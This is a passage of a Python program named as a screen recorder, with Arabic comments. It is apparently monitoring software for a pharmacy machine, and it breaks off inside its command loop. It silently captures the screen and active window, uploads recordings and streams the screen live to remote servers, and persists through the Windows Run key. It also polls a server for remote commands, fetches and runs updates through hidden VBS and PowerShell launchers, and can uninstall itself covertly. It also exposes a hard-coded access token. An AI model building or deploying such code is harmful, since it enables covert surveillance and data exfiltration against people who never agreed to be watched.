# screen_recorder.py
import os
import sys
import time
import json
import mss
import pyautogui
import subprocess
import numpy as np
from PIL import Image
import requests
import winreg
import socket
import shutil
from datetime import datetime
from threading import Thread, Event
from urllib.parse import urlparse

# ---- دعم معرفة البرنامج/النافذة النشطة (اختياري) ----
try:
    import win32gui
    import win32process
    import psutil
    _HAVE_ACTIVE_WIN_LIBS = True
except Exception:
    psutil = None
    _HAVE_ACTIVE_WIN_LIBS = False

def get_active_program():
    if not _HAVE_ACTIVE_WIN_LIBS:
        return None
    try:
        hwnd = win32gui.GetForegroundWindow()
        if not hwnd:
            return None
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        exe = None
        try:
            proc = psutil.Process(pid)
            exe = proc.name()
        except Exception:
            exe = None
        try:
            title = win32gui.GetWindowText(hwnd)
        except Exception:
            title = ""
        return {"exe": exe, "title": title, "pid": pid}
    except Exception:
        return None

# ==================== الإعدادات العامة ====================
VERSION = "1.1.4"  # إصلاح ترتيب التحديث + مشغّل باتش متعدد الطرق + عدم الإغلاق قبل التأكد

APPDATA_BASE = os.path.join(os.environ.get('APPDATA', ''), "ScreenRecorder", "recordings")

segment_minutes    = 10
fps                = 10
inactive_threshold = 60
target_height      = 720
preset             = "slow"
crf                = 23

# ======== URLs — HTTPS ========
SERVER_URL        = "https://www.beinscreen.com/upload.php"
DEVICE_NAME       = "BalsamPharmacy2-2"  # يُستبدل وقت الـ build

HEARTBEAT_URL       = "https://www.beinscreen.com/heartbeat.php"
RECORDER_TOKEN      = "2677f137eec00c8b7401dcba687678fe5bc2fc7e1a0fb3efd5395d910bff4ee0"
HEARTBEAT_INTERVAL  = 20

COMMANDS_PULL_URL      = "https://www.beinscreen.com/commands_pull.php"
COMMANDS_ACK_URL       = "https://www.beinscreen.com/commands_ack.php"
COMMANDS_POLL_INTERVAL = 15

# ---- Tuning ----
KEY_SAMPLE_HZ     = 1
KEY_FLUSH_SECS    = 5
UPLOAD_RETRIES    = 3
UPLOAD_BACKOFF    = 5
UPLOAD_TIMEOUT    = (10, 600)
CAPTURE_MONITOR_INDEX = 1

RETENTION_DAYS  = 10
LOG_FILENAME    = "log.txt"

# ---- FFmpeg ----
FFMPEG_MOVFLAGS = "frag_keyframe+empty_moov"

# ===== Live streaming =====
LIVE_ENABLED_DEFAULT    = True
LIVE_RTMP_ORIGIN        = "rtmp://49.12.70.106:1935"
LIVE_APP                = "live"
LIVE_FPS                = 15
LIVE_HEIGHT             = 540
LIVE_PRESET             = "veryfast"
LIVE_TUNE               = "zerolatency"
LIVE_GOP_SECONDS        = 1
LIVE_PUSH_WHEN_INACTIVE = True
LIVE_RESTART_GRACE_SECS = 5

# ==================== أعلام عامة ====================
UPLOADING = False
IS_RECORDING = False
CURRENT_FILE_REL = None
LAST_PROG_INFO_FOR_HB = None

_hb_stop  = Event()
_cmd_stop = Event()
_shutdown_requested = Event()
_UNINSTALLING = Event()
_UPDATING_NOW = Event()

LIVE_ENABLED = LIVE_ENABLED_DEFAULT
_live_proc = None
_live_fflog = None
_live_size = (0, 0)
_last_live_restart_ts = 0.0

# ==================== logging ====================
base_folder = APPDATA_BASE
os.makedirs(base_folder, exist_ok=True)

def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(os.path.join(base_folder, LOG_FILENAME), "a", encoding="utf-8") as lf:
            lf.write(f"[{ts}] {msg}\n")
    except Exception:
        pass

# ==================== شهادات HTTPS (certifi) ====================
CERT_PATH = None
REQUESTS_VERIFY = True

def _setup_cert_bundle():
    global CERT_PATH, REQUESTS_VERIFY
    try:
        import certifi
        src = certifi.where()
        if os.path.exists(src):
            CERT_PATH = os.path.join(base_folder, "cacert.pem")
            try:
                if not os.path.exists(CERT_PATH) or os.path.getsize(CERT_PATH) != os.path.getsize(src):
                    shutil.copyfile(src, CERT_PATH)
            except Exception:
                CERT_PATH = src
            os.environ['SSL_CERT_FILE'] = CERT_PATH
            os.environ['REQUESTS_CA_BUNDLE'] = CERT_PATH
            REQUESTS_VERIFY = CERT_PATH
        else:
            REQUESTS_VERIFY = True
    except Exception as e:
        log(f"cert bundle setup failed: {e}")
        REQUESTS_VERIFY = True

_setup_cert_bundle()

def _http_session():
    s = requests.Session()
    s.verify = REQUESTS_VERIFY
    return s

def _http_post(url, **kwargs):
    kwargs.setdefault("timeout", 10)
    kwargs.setdefault("verify", REQUESTS_VERIFY)
    return requests.post(url, **kwargs)

def _http_get(url, **kwargs):
    kwargs.setdefault("timeout", 10)
    kwargs.setdefault("verify", REQUESTS_VERIFY)
    return requests.get(url, **kwargs)

# ==================== FFmpeg path ====================
def _validate_ffmpeg(exe_path: str) -> bool:
    try:
        r = subprocess.run([exe_path, "-version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return r.returncode == 0
    except Exception:
        return False

def get_ffmpeg_path():
    candidates = []
    if getattr(sys, 'frozen', False):
        meipass = getattr(sys, "_MEIPASS", None)
        if meipass:
            candidates.append(os.path.join(meipass, "ffmpeg.exe"))
        candidates.append(os.path.join(os.path.dirname(sys.executable), "ffmpeg.exe"))
        candidates.append(os.path.join(os.path.dirname(sys.executable), "bin", "ffmpeg.exe"))
    else:
        here = os.path.dirname(os.path.abspath(__file__))
        candidates.append(os.path.join(here, "ffmpeg.exe"))
        candidates.append(os.path.join(here, "bin", "ffmpeg.exe"))
    candidates.append("ffmpeg")  # PATH

    for c in candidates:
        if c == "ffmpeg":
            if _validate_ffmpeg("ffmpeg"):
                return "ffmpeg"
        else:
            if os.path.exists(c) and _validate_ffmpeg(c):
                return c
    log(f"FFmpeg not found. Tried: {candidates}")
    return None

FFMPEG_PATH = get_ffmpeg_path()
if not FFMPEG_PATH:
    raise RuntimeError("ffmpeg.exe not found. ضع ffmpeg.exe بجوار EXE أو ضمن PATH أو داخل bin\\ffmpeg.exe")

# ==================== ملفات/ماركرات التحديث ====================
PENDING_UPDATE_FILE = os.path.join(base_folder, "pending_update.json")

def _semver_tuple(v: str):
    try:
        parts = [int(p) for p in str(v).strip().split(".") if p != ""]
        while len(parts) < 3: parts.append(0)
        return tuple(parts[:3])
    except Exception:
        return (0,0,0)

def _version_ge(a: str, b: str) -> bool:
    return _semver_tuple(a) >= _semver_tuple(b)

def _sha256_file(path):
    import hashlib
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(1024*1024), b''):
            h.update(chunk)
    return h.hexdigest().lower()

def _download_to(path, url, expected_size=None, expected_sha=None, timeout=(10,600), max_tries=4):
    """
    تحميل مع استئناف تلقائي + تحقق حجم/هاش.
    يُكتب مؤقتًا إلى path.part ثم يُستبدل atomically بـ path عند النجاح.
    """
    tmp = path + ".part"
    for attempt in range(1, max_tries+1):
        try:
            existing = 0
            headers = {}
            mode = "wb"
            if os.path.exists(tmp):
                try:
                    existing = os.path.getsize(tmp)
                except Exception:
                    existing = 0
            if existing > 0:
                headers["Range"] = f"bytes={existing}-"
                mode = "ab"

            with _http_get(url, stream=True, timeout=timeout, headers=headers) as r:
                if "Range" in headers and r.status_code == 200:
                    mode = "wb"  # السيرفر لا يدعم Range
                if r.status_code == 416:
                    try: os.remove(tmp)
                    except Exception: pass
                    if attempt == max_tries:
                        r.raise_for_status()
                    else:
                        continue
                r.raise_for_status()
                with open(tmp, mode) as f:
                    for chunk in r.iter_content(chunk_size=262144):
                        if chunk:
                            f.write(chunk)

            total = os.path.getsize(tmp)
            if expected_size and int(expected_size) > 0 and total != int(expected_size):
                if attempt < max_tries:
                    try: os.remove(tmp)
                    except Exception: pass
                    continue
                raise RuntimeError(f"size mismatch: got {total}, want {expected_size}")

            if expected_sha:
                sha = _sha256_file(tmp)
                if sha.lower() != str(expected_sha).lower():
                    if attempt < max_tries:
                        try: os.remove(tmp)
                        except Exception: pass
                        continue
                    raise RuntimeError(f"sha256 mismatch: got {sha}, want {expected_sha}")

            if os.path.exists(path):
                try: os.remove(path)
                except Exception: pass
            os.replace(tmp, path)
            return path

        except Exception as e:
            log(f"download attempt {attempt}/{max_tries} failed: {e}")
            if attempt == max_tries:
                try:
                    if os.path.exists(tmp): os.remove(tmp)
                except Exception:
                    pass
                raise
            time.sleep(2 * attempt)

def _copy_file(src, dst, verify_sha: str|None):
    shutil.copyfile(src, dst)
    if verify_sha:
        sha = _sha256_file(dst)
        if sha.lower() != verify_sha.lower():
            try: os.remove(dst)
            except Exception: pass
            raise RuntimeError(f"post-copy sha mismatch: {sha} != {verify_sha}")

def _write_update_batch(batch_path, old_path, staged_path, final_path, pid):
    exe_dir  = os.path.dirname(old_path)
    final_name = os.path.basename(final_path)
    bat = f"""@echo off
setlocal enableextensions enabledelayedexpansion
set "OLD={old_path}"
set "NEWSTAGE={staged_path}"
set "FINAL={final_path}"
set "PID={pid}"
set RETRIES=300

echo [%date% %time%] OLD=%OLD%  NEWSTAGE=%NEWSTAGE%  FINAL=%FINAL%  PID=%PID% > "{exe_dir}\\update_trace.log"

pushd "{exe_dir}" >nul 2>&1

for /L %%I in (1,1,180) do (
  tasklist /FI "PID eq %PID%" | find "%PID%" >nul
  if errorlevel 1 goto :ready
  timeout /t 1 /nobreak >nul
)

:ready
taskkill /PID %PID% /F 2>nul
taskkill /IM ffmpeg.exe /F 2>nul

attrib -r -s -h "%OLD%"   >nul 2>&1
attrib -r -s -h "%FINAL%" >nul 2>&1
del /f /q "%OLD%"   >nul 2>&1
del /f /q "%FINAL%" >nul 2>&1

:loop
move /y "%NEWSTAGE%" "%FINAL%" >nul 2>&1
if %errorlevel%==0 goto :launched

copy /b /y "%NEWSTAGE%" "%FINAL%" >nul 2>&1
if %errorlevel%==0 goto :launched

powershell -NoProfile -Command "try {{ Copy-Item -LiteralPath '%NEWSTAGE%' -Destination '%FINAL%' -Force; exit 0 }} catch {{ exit 1 }}"
if %errorlevel%==0 goto :launched

set /a RETRIES-=1
if %RETRIES% LEQ 0 goto :fail
timeout /t 2 /nobreak >nul
goto :loop

:launched
echo [%date% %time%] Launching "%FINAL%" >> "{exe_dir}\\update_trace.log"
start "" "%FINAL%"

del /f /q "%NEWSTAGE%" >nul 2>&1

rem === [ADDED] تنظيف أي ملفات EXE قديمة مع إعادة المحاولة حتى 30 ثانية ===
set _CLEAN_TRIES=0
:clean_old
set "_FOUND_OLD=0"
for %%F in ("{exe_dir}\\*.exe") do (
  if /I not "%%~nxF"=="ffmpeg.exe" (
    if /I not "%%~nxF"=="{final_name}" (
      set "_FOUND_OLD=1"
      attrib -r -s -h "%%~fF" >nul 2>&1
      del /f /q "%%~fF" >nul 2>&1
    )
  )
)
if "%_FOUND_OLD%"=="1" (
  set /a _CLEAN_TRIES+=1
  if %_CLEAN_TRIES% LSS 30 (
    timeout /t 1 /nobreak >nul
    goto :clean_old
  )
)

popd >nul 2>&1
del /f /q "%~f0" >nul 2>&1
exit /b 0

:fail
echo [%date% %time%] Update failed after waits >> "{exe_dir}\\update_fail.log"
exit /b 1
"""
    with open(batch_path, "w", encoding="utf-8") as f:
        f.write(bat)

def _start_batch_hidden(batch_path) -> bool:
    """
    نجرب 3 طرق تشغيل لتفادي بيئات بتمنع wscript:
    1) wscript (Hidden)
    2) cmd.exe /c (Detached + No window)
    3) PowerShell Start-Process -WindowStyle Hidden
    """
    try:
        # 1) VBS
        vbs_path = batch_path[:-4] + ".vbs"
        vbs = f'''Set sh = CreateObject("WScript.Shell")
sh.Run "cmd /c ""{batch_path}""", 0, False
'''
        with open(vbs_path, "w", encoding="utf-8") as vf:
            vf.write(vbs)
        creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        subprocess.Popen(["wscript.exe", vbs_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         creationflags=creationflags)
        return True
    except Exception as e:
        log(f"VBS runner failed: {e}")

    try:
        # 2) CMD (Detached)
        DETACHED = getattr(subprocess, "DETACHED_PROCESS", 0x00000008)
        CREATE_NEW_PROCESS_GROUP = getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0x00000200)
        CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
        subprocess.Popen(["cmd.exe", "/c", batch_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         creationflags=DETACHED | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW)
        return True
    except Exception as e2:
        log(f"CMD runner failed: {e2}")

    try:
        # 3) PowerShell Start-Process
        ps_cmd = f'Start-Process -FilePath "cmd.exe" -ArgumentList \'/c "{batch_path}"\' -WindowStyle Hidden'
        subprocess.Popen(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_cmd],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e3:
        log(f"PowerShell runner failed: {e3}")
        return False

def _apply_update(command_id: int, payload: dict):
    """
    مسار تحديث آمن:
    - حمّل فى %TEMP% (Resume + تحقق).
    - انسخ نسخة Staging فى نفس فولدر البرنامج: __new_<ver>.exe.
    - اكتب الباتش داخل نفس الفولدر.
    - أوقف اللايف/ffmpeg.
    - شغّل الباتش (hidden) ثم اخرج.
    - لو أى خطوة فشلت: لا نغلق العميل.
    """
    if _UPDATING_NOW.is_set():
        return
    _UPDATING_NOW.set()
    try:
        # Parse payload
        if isinstance(payload, str):
            try: payload = json.loads(payload)
            except Exception: payload = {}
        url = (payload or {}).get("url")
        sha = (payload or {}).get("sha256")
        size = (payload or {}).get("size")
        ver  = (payload or {}).get("version") or ""
        if not url or not sha or not ver:
            ack_command(command_id, "error", "bad update payload")
            return

        # مسارات
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        exe_dir  = os.path.dirname(exe_path)
        temp_dir = os.environ.get("TEMP", exe_dir)
        os.makedirs(temp_dir, exist_ok=True)

        # 1) التحميل فى TEMP
        downloaded_tmp = os.path.join(temp_dir, f"_update_{int(time.time())}_{ver}.exe")
        log(f"Update requested to v{ver} from {url}")
        _download_to(downloaded_tmp, url, expected_size=size, expected_sha=sha, timeout=UPLOAD_TIMEOUT, max_tries=4)
        if not (os.path.exists(downloaded_tmp) and os.path.getsize(downloaded_tmp) > 0):
            raise RuntimeError("downloaded file missing/empty")
        log(f"Downloaded update to {downloaded_tmp}")

        # 2) Staging داخل فولدر البرنامج
        staged_path = os.path.join(exe_dir, f"__new_{ver}.exe")
        try:
            if os.path.exists(staged_path): os.remove(staged_path)
        except Exception: pass
        _copy_file(downloaded_tmp, staged_path, verify_sha=sha)
        try: os.remove(downloaded_tmp)
        except Exception: pass
        if not (os.path.exists(staged_path) and os.path.getsize(staged_path) > 0):
            raise RuntimeError("staged file missing/empty")
        log(f"Staged new exe at {staged_path}")

        # 3) اسم النسخة النهائية
        final_path = os.path.join(exe_dir, f"{DEVICE_NAME}_{ver}.exe")

        # 4) كتابة الباتش داخل فولدر البرنامج
        batch = os.path.join(exe_dir, f"_apply_update_{int(time.time())}.bat")
        pid = os.getpid()
        _write_update_batch(batch, exe_path, staged_path, final_path, pid)
        if not os.path.exists(batch):
            raise RuntimeError("batch file not created")

        # 5) أوقف اللايف/ffmpeg (دلوقتي فقط)
        try: _stop_live_pusher()
        except Exception: pass
        try:
            subprocess.run(["taskkill", "/IM", "ffmpeg.exe", "/F"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
        except Exception:
            pass

        # 6) شغّل الباتش (لو فشل — لا نقفل)
        if not _start_batch_hidden(batch):
            ack_command(command_id, "error", "cannot start update batch")
            log("Failed to start update batch; aborting update without exit.")
            return

        # 7) ماركر علشان النسخة الجديدة تأكّد (ACK=done) بعد الإقلاع
        try:
            with open(PENDING_UPDATE_FILE, "w", encoding="utf-8") as pf:
                json.dump({"command_id": int(command_id), "version": str(ver)}, pf)
        except Exception:
            pass

        # 8) Signal + خروج بعد تشغيل الباتش
        ack_command(command_id, "in_progress", f"update applying to {ver}")
        send_heartbeat_with({"update": {"target": ver, "status": "applying"}})
        log("Exiting for self-update...")
        _shutdown_requested.set()
        os._exit(0)

    except Exception as e:
        log(f"Update failed: {e}")
        try: ack_command(command_id, "error", f"{e}")
        except Exception: pass
    finally:
        _UPDATING_NOW.clear()

def _post_update_check_and_ack():
    """بعد الإقلاع: لو وصلنا لهدف الإصدار نبعت ACK=done ونمسح الماركر."""
    try:
        if not os.path.exists(PENDING_UPDATE_FILE):
            return
        with open(PENDING_UPDATE_FILE, "r", encoding="utf-8") as pf:
            st = json.load(pf)
        cmd_id = int(st.get("command_id") or 0)
        want   = str(st.get("version") or "")
        if cmd_id <= 0 or not want:
            os.remove(PENDING_UPDATE_FILE); return
        if _version_ge(str(VERSION), want):
            ack_command(cmd_id, "done", f"updated to {VERSION}")
            os.remove(PENDING_UPDATE_FILE)
        else:
            # لو عدّى ساعة ولسه مش متحدّث — بلّغ
            mtime = os.path.getmtime(PENDING_UPDATE_FILE)
            if time.time() - mtime > 3600:
                ack_command(cmd_id, "error", f"still on {VERSION}, want {want}")
                os.remove(PENDING_UPDATE_FILE)
    except Exception as e:
        log(f"post_update_check error: {e}")

# ==================== Live helpers ====================
def _live_url():
    return f"{LIVE_RTMP_ORIGIN}/{LIVE_APP}/{DEVICE_NAME}"

def _derive_http_from_rtmp(origin: str):
    try:
        u = urlparse(origin)
        host = u.hostname or "127.0.0.1"
        rtmp_port = u.port or 1935
        http_port = 8080 if rtmp_port == 1935 else rtmp_port
        return host, http_port
    except Exception:
        return "127.0.0.1", 8080

def _live_http_urls():
    host, http_port = _derive_http_from_rtmp(LIVE_RTMP_ORIGIN)
    base = f"http://{host}:{http_port}/{LIVE_APP}/{DEVICE_NAME}"
    return {"host": host, "port": http_port, "hls": f"{base}.m3u8", "flv": f"{base}.flv"}

def _log_identity_once():
    try:
        urls = _live_http_urls()
        log(
            "IDENTITY | "
            f"VERSION={VERSION} | "
            f"DEVICE_NAME_CONST={DEVICE_NAME} | "
            f"RTMP={_live_url()} | "
            f"HLS={urls['hls']} | FLV={urls['flv']}"
        )
    except Exception:
        pass

def _tcp_can_connect(host: str, port: int, timeout=3.0) -> bool:
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False

def _ensure_even(x: int) -> int:
    return x if x % 2 == 0 else x - 1

def _start_live_pusher(w, h):
    global _live_proc, _live_fflog
    if _shutdown_requested.is_set():
        return
    if _live_proc is not None:
        return
    w = _ensure_even(int(w)); h = _ensure_even(int(h))

    try:
        u = urlparse(LIVE_RTMP_ORIGIN)
        rtmp_host = u.hostname or "127.0.0.1"
        rtmp_port = u.port or 1935
    except Exception:
        rtmp_host, rtmp_port = "127.0.0.1", 1935

    if not _tcp_can_connect(rtmp_host, rtmp_port, timeout=3.0):
        log(f"WARNING: Cannot connect to RTMP {rtmp_host}:{rtmp_port}.")

    try:
        gop = max(1, int(LIVE_FPS * LIVE_GOP_SECONDS))
        live_url = _live_url()
        try:
            _live_fflog = open(os.path.join(base_folder, "live_ffmpeg_stderr.log"), "ab", buffering=0)
        except Exception:
            _live_fflog = subprocess.DEVNULL

        cmd = [
            FFMPEG_PATH, "-y",
            "-f", "rawvideo", "-pix_fmt", "rgb24",
            "-s", f"{w}x{h}", "-r", str(LIVE_FPS), "-i", "-",
            "-c:v", "libx264",
            "-pix_fmt", "yuv420p",
            "-preset", LIVE_PRESET,
            "-tune", LIVE_TUNE,
            "-profile:v", "baseline", "-level", "3.1",
            "-x264opts", f"keyint={gop}:min-keyint={gop}:scenecut=0",
            "-g", str(gop), "-bf", "0",
            "-flvflags", "no_duration_filesize",
            "-f", "flv", live_url
        ]
        creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        _live_proc = subprocess.Popen(
            cmd,
            stdin=subprocess.PIPE,
            stdout=subprocess.DEVNULL,
            stderr=_live_fflog,
            creationflags=creationflags
        )
        log(f"Live pusher started to {live_url} at {w}x{h}@{LIVE_FPS}")
    except Exception as e:
        _live_proc = None
        log(f"Failed to start live pusher: {e}")

def _push_live_frame(pil_frame_rgb24):
    global _live_proc
    if _live_proc is None:
        return
    try:
        _live_proc.stdin.write(pil_frame_rgb24.tobytes())
    except Exception as e:
        log(f"Live pipe write failed, will stop live: {e}")
        try:
            _live_proc.stdin.close()
        except Exception:
            pass
        _live_proc = None

def _stop_live_pusher():
    global _live_proc, _live_fflog
    if _live_proc is not None:
        try:
            _live_proc.stdin.close()
        except Exception:
            pass
        try:
            _live_proc.terminate()
        except Exception:
            pass
        _live_proc = None
        log("Live pusher stopped.")
    if _live_fflog not in (None, subprocess.DEVNULL):
        try:
            _live_fflog.close()
        except Exception:
            pass
    _live_fflog = None

def _ensure_live_running(w, h):
    global _last_live_restart_ts
    if _shutdown_requested.is_set() or not LIVE_ENABLED:
        return
    need_restart = (_live_proc is None) or (_live_proc and (_live_proc.poll() is not None))
    if need_restart:
        now = time.time()
        if now - _last_live_restart_ts >= LIVE_RESTART_GRACE_SECS:
            _stop_live_pusher()
            _start_live_pusher(w, h)
            _last_live_restart_ts = now

# ==================== Startup registry ====================
def add_to_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ScreenRecorder", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        log(f"Added to startup: {exe_path}")
    except Exception as e:
        log(f"Failed to add to startup: {e}")

try:
    add_to_startup()
except Exception:
    pass

# ==================== تنظيف قديم ====================
def cleanup_old_uploaded_files():
    now = time.time()
    cutoff = now - RETENTION_DAYS * 86400
    deleted = 0
    for root, dirs, files in os.walk(base_folder):
        for filename in files:
            if not filename.endswith(".key"):
                continue
            key_path = os.path.join(root, filename)
            try:
                if not os.path.isfile(key_path):
                    continue
                mtime = os.path.getmtime(key_path)
                if mtime > cutoff:
                    continue
                with open(key_path, "r", encoding="utf-8") as kf:
                    data = json.load(kf)
                if not data.get("uploaded", False):
                    continue
                blob_path = key_path[:-4] + ".blob"
                if os.path.exists(blob_path):
                    os.remove(blob_path)
                os.remove(key_path)
                deleted += 1
                log(f"Deleted old uploaded pair: {key_path}")
            except Exception as e:
                log(f"Error during cleanup of {key_path}: {e}")
    return deleted

# ==================== رفع الملفات ====================
def try_upload(blob_file, key_file, year, month, day):
    global UPLOADING
    uploaded_successfully = False
    UPLOADING = True
    session = _http_session()
    files = None
    try:
        for attempt in range(1, UPLOAD_RETRIES + 1):
            try:
                files = {
                    'blob': open(blob_file, 'rb'),
                    'key': open(key_file, 'r', encoding='utf-8')
                }
                data = {'device_name': DEVICE_NAME, 'year': year, 'month': month, 'day': day}

                try:
                    send_heartbeat()
                except Exception:
                    pass

                resp = session.post(SERVER_URL, files=files, data=data, timeout=UPLOAD_TIMEOUT)
                if resp.status_code == 200:
                    uploaded_successfully = True
                    log(f"Upload success: {blob_file}")
                    break
                else:
                    log(f"Upload failed (status {resp.status_code}) attempt {attempt}/{UPLOAD_RETRIES}: {blob_file}")
            except Exception as e:
                log(f"Upload exception attempt {attempt}/{UPLOAD_RETRIES} for {blob_file}: {e}")
            finally:
                try:
                    if files:
                        files['blob'].close()
                        files['key'].close()
                except Exception:
                    pass

            if attempt < UPLOAD_RETRIES:
                time.sleep(UPLOAD_BACKOFF * attempt)
    finally:
        UPLOADING = False
        try:
            send_heartbeat()
        except Exception:
            pass
    return uploaded_successfully

def upload_and_mark(blob_file, key_file, year, month, day):
    success = try_upload(blob_file, key_file, year, month, day)
    try:
        if os.path.exists(key_file):
            with open(key_file, 'r', encoding='utf-8') as kf:
                kd = json.load(kf)
        else:
            kd = {}
        kd['uploaded'] = bool(success)
        kd['last_upload_attempt'] = datetime.now().isoformat()
        with open(key_file, 'w', encoding='utf-8') as kf:
            json.dump(kd, kf, indent=2)
    except Exception as e:
        log(f"Failed to update key file after upload attempt {key_file}: {e}")
    return success

def retry_pending_uploads():
    retried = 0
    for root, dirs, files in os.walk(base_folder):
        for filename in files:
            if not filename.endswith(".key"):
                continue
            key_path = os.path.join(root, filename)
            blob_path = key_path[:-4] + ".blob"
            try:
                with open(key_path, 'r', encoding='utf-8') as kf:
                    kd = json.load(kf)
                if kd.get('uploaded', False):
                    continue
                if not os.path.exists(blob_path):
                    continue
                rel = os.path.relpath(root, base_folder).split(os.sep)
                year = rel[0] if len(rel) > 0 else time.strftime("%Y")
                month = rel[1] if len(rel) > 1 else time.strftime("%m")
                day = rel[2] if len(rel) > 2 else time.strftime("%d")
                success = upload_and_mark(blob_path, key_path, year, month, day)
                if success:
                    retried += 1
            except Exception:
                continue
    return retried

# ==================== Heartbeat ====================
def count_pending_uploads():
    if _UNINSTALLING.is_set():
        return 0
    pending = 0
    for root, _, files in os.walk(base_folder):
        for fn in files:
            if not fn.endswith(".key"):
                continue
            key_path = os.path.join(root, fn)
            blob_path = key_path[:-4] + ".blob"
            try:
                with open(key_path, "r", encoding="utf-8") as kf:
                    kd = json.load(kf)
                if not kd.get("uploaded", False) and os.path.exists(blob_path):
                    pending += 1
            except Exception:
                continue
    return pending

def _base_status():
    st = {
        "version": VERSION,
        "is_recording": bool(IS_RECORDING),
        "is_uploading": bool(UPLOADING),
        "current_file": None if _UNINSTALLING.is_set() else CURRENT_FILE_REL,
        "pending": count_pending_uploads(),
        "fps": fps,
        "ts": datetime.now().isoformat(),
        "client_present": 0 if _UNINSTALLING.is_set() else 1,
    }
    if LAST_PROG_INFO_FOR_HB:
        st["active_program"] = LAST_PROG_INFO_FOR_HB
    try:
        urls = _live_http_urls()
        st["live"] = {
            "enabled": bool(LIVE_ENABLED),
            "active": bool(_live_proc is not None),
            "url": _live_url(),
            "fps": LIVE_FPS,
            "height": LIVE_HEIGHT,
            "http_host": urls["host"],
            "http_port": urls["port"],
            "hls": urls["hls"],
            "flv": urls["flv"],
        }
    except Exception:
        pass
    if psutil:
        try:
            st["cpu"] = psutil.cpu_percent(interval=None)
            st["mem"] = psutil.virtual_memory().percent
        except Exception:
            pass
    return st

def send_heartbeat():
    try:
        _http_post(HEARTBEAT_URL, json={"device_name": DEVICE_NAME, "token": RECORDER_TOKEN, "status": _base_status()}, timeout=5)
    except Exception:
        pass

def send_heartbeat_with(extra: dict):
    st = _base_status()
    if isinstance(extra, dict):
        st.update(extra)
    try:
        _http_post(HEARTBEAT_URL, json={"device_name": DEVICE_NAME, "token": RECORDER_TOKEN, "status": st}, timeout=5)
    except Exception:
        pass

def heartbeat_loop():
    while not _hb_stop.is_set():
        send_heartbeat()
        _hb_stop.wait(HEARTBEAT_INTERVAL)

# ==================== أوامر السيرفر ====================
def ack_command(command_id: int, status: str, message: str = ""):
    payload = {
        "device_name": DEVICE_NAME,
        "token": RECORDER_TOKEN,
        "command_id": int(command_id),
        "status": status,
        "message": (message or "")[:480]
    }
    try:
        _http_post(COMMANDS_ACK_URL, json=payload, timeout=10)
    except Exception:
        pass

def schedule_self_uninstall():
    """إزالة ذاتية آمنة ومخفية."""
    try:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            try:
                winreg.DeleteValue(key, "ScreenRecorder")
            except Exception:
                pass
            winreg.CloseKey(key)
        except Exception:
            pass

        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        ffmpeg   = FFMPEG_PATH or ""
        appdir   = os.path.dirname(APPDATA_BASE)  # %APPDATA%\ScreenRecorder
        pid      = os.getpid()
        script_path = None
        if not getattr(sys, 'frozen', False):
            try:
                script_path = os.path.abspath(sys.argv[0])
            except Exception:
                script_path = None

        temp_dir = os.environ.get("TEMP", os.getcwd())
        bat_path = os.path.join(temp_dir, f"sr_uninstall_{pid}.bat")
        q = lambda p: f'"{p}"'

        bat_lines = [
            "@echo off",
            "setlocal enabledelayedexpansion",
            f"for /l %%i in (1,1,30) do (",
            f"  timeout /t 1 /nobreak >nul",
            f"  tasklist /FI \"PID eq {pid}\" | find \"{pid}\" >nul",
            f"  if errorlevel 1 goto :closed",
            f")",
            ":closed",
            "taskkill /IM ffmpeg.exe /F 2>nul",
        ]
        if appdir:
            bat_lines.append(f'attrib -r -s -h {q(appdir)} /s 2>nul')
            bat_lines.append(f'rd /s /q {q(appdir)} 2>nul')
        if ffmpeg and os.path.isfile(ffmpeg):
            bat_lines.append(f'attrib -r -s -h {q(ffmpeg)} 2>nul')
            bat_lines.append(f'del /f /q {q(ffmpeg)} 2>nul')

        bat_lines.append(f'attrib -r -s -h {q(exe_path)} 2>nul')
        bat_lines.append(f'del /f /q {q(exe_path)} 2>nul')

        if script_path and script_path != exe_path and os.path.isfile(script_path):
            bat_lines.append(f'attrib -r -s -h {q(script_path)} 2>nul')
            bat_lines.append(f'del /f /q {q(script_path)} 2>nul')

        bat_lines.append('del /f /q "%~f0" 2>nul')

        with open(bat_path, "w", encoding="utf-8") as f:
            f.write("\r\n".join(bat_lines) + "\r\n")

        vbs_path = os.path.join(temp_dir, f"sr_uninstall_{pid}.vbs")
        vbs_content = f'''Set sh = CreateObject("WScript.Shell")
sh.Run "cmd /c ""{bat_path}""", 0, False
'''
        with open(vbs_path, "w", encoding="utf-8") as vf:
            vf.write(vbs_content)

        creationflags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
        subprocess.Popen(["wscript.exe", vbs_path], creationflags=creationflags)

        return True, "uninstall scheduled (hidden vbs runner)"
    except Exception as e:
        return False, str(e)

def commands_loop():
    global LIVE_ENABLED
    while not _cmd_stop.is_set():
        try:
            payload = {"device_name": DEVICE_NAME, "token": RECORDER_TOKEN}
